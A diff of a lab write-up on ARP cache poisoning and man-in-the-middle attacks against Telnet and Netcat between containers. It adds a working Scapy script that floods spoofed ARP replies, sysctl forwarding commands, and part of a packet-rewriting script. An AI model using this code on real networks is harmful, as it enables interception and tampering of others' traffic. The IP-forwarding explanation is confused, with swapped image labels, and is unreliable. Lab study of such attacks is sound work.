@@ -90,11 +90,57 @@ sendp(ethernet/arp)
 
 # MITM Attack on Telnet using ARP Cache Poisoning
 
+This code uses the Scapy library to send Address Resolution Protocol (ARP) reply packets to spoof the MAC addresses of two hosts on a network. I set the IP addresses and MAC addresses for three hosts on the network. The code creates two ARP reply packets using the ARP class from Scapy. Each packet is set up with the appropriate source and destination MAC and IP addresses. The code enters a loop that sends the two ARP packets continuously every 5 seconds using the send() function from Scapy.
+The effect of sending these packets is to cause the two target hosts to update their ARP tables with the incorrect MAC addresses for each other, effectively redirecting their traffic through the host with the spoofed MAC address. This can be used for malicious purposes such as intercepting or modifying network traffic.
+
+```
+#!/usr/bin/env python3
+from scapy.all import *
+# Set the target IP addresses
+target_a_ip = '10.9.0.5'
+target_b_ip = '10.9.0.6'
+# Set the MAC addresses for Hosts A, B, and M
+host_a_mac = '02:42:0a:09:00:05'
+host_b_mac = '02:42:0a:09:00:06'
+host_m_mac = '02:42:0a:09:00:69'
+# Create the ARP reply packets
+arp_a = ARP(op=2, hwsrc=host_m_mac, psrc=target_b_ip, hwdst=host_a_mac, pdst=target_a_ip)
+arp_b = ARP(op=2, hwsrc=host_m_mac, psrc=target_a_ip, hwdst=host_b_mac, pdst=target_b_ip)
+# Send the packets continuously every 5 seconds
+while True:
+       send(arp_a)
+       send(arp_b)
+       time.sleep(5)
+```
+
+### With IP Forwarding Enabled
+
+```
+sysctl net.ipv4.ip_forward=1
+```
+
+![ip-forward-off](https://user-images.githubusercontent.com/126002808/220438539-3e69a4e5-ea23-459f-a3a4-0dd51d6bd9e6.png)
+
+If IP forwarding is enabled on Host M, it will forward the packets between Host A and Host B. Therefore, both Host A and Host B will receive the ARP reply packets sent by Host M. However, if IP forwarding is disabled on Host M, it will not forward the packets, and Host B will not receive the ARP reply packets sent by Host M. As a result, only Host A will receive the ARP reply packets in this case.
+
+### With IP Forwarding Disabled
+
+```
+sysctl net.ipv4.ip_forward=0
+```
+
+![ip-forward-on](https://user-images.githubusercontent.com/126002808/220438591-160fc830-0bc4-4800-ab72-6b2cd609f1e7.png)
+
+In summary, if IP forwarding is disabled on Host M, only Host A will receive the ARP reply packets, while if IP forwarding is enabled on Host M, both Host A and Host B will receive the ARP reply packets.
+
+## Launching an MitM Attack on Telnet
+
 Here is an example of a sniff-and-spoof program that intercepts TCP packets between Container A and Container B on the same LAN and replaces each typed character with a fixed character (Z):
 
 ```
 #!/usr/bin/env python3
 from scapy.all import *
+print ("Nigel is injecting Zs")
 
 IP_A = "10.9.0.5"
 MAC_A = "02:42:0a:09:00:05"
@@ -130,21 +176,11 @@ def spoof_pkt(pkt):
 f = 'tcp'
 pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
 ```
+
 In this script, I added a newdata variable that contains the payload data consisting of a series of Z's. If the original payload data is not empty, it should use the length of the original payload data to generate a string of Z's with the same length. The script then replaces the original payload data with the new data and send the modified packet.
 
-### With IP Forwarding Enabled
 
-![ip-forward-off](https://user-images.githubusercontent.com/126002808/220438539-3e69a4e5-ea23-459f-a3a4-0dd51d6bd9e6.png)
-
-If IP forwarding is enabled on Host M, it will forward the packets between Host A and Host B. Therefore, both Host A and Host B will receive the ARP reply packets sent by Host M. However, if IP forwarding is disabled on Host M, it will not forward the packets, and Host B will not receive the ARP reply packets sent by Host M. As a result, only Host A will receive the ARP reply packets in this case.
-
-### With IP Forwarding Disabled
-
-![ip-forward-on](https://user-images.githubusercontent.com/126002808/220438591-160fc830-0bc4-4800-ab72-6b2cd609f1e7.png)
-
-In summary, if IP forwarding is disabled on Host M, only Host A will receive the ARP reply packets, while if IP forwarding is enabled on Host M, both Host A and Host B will receive the ARP reply packets.
-
-## Launching an  MitM Attack on Netcat
+## Launching an MitM Attack on Netcat
 
 The below code performs a Man-in-the-Middle (MitM) attack on ```Netcat``` traffic between two hosts, Host A and Host B. <br/>
 I do this by modifying the ```Netcat``` data in packets transmitted between them. <br/>
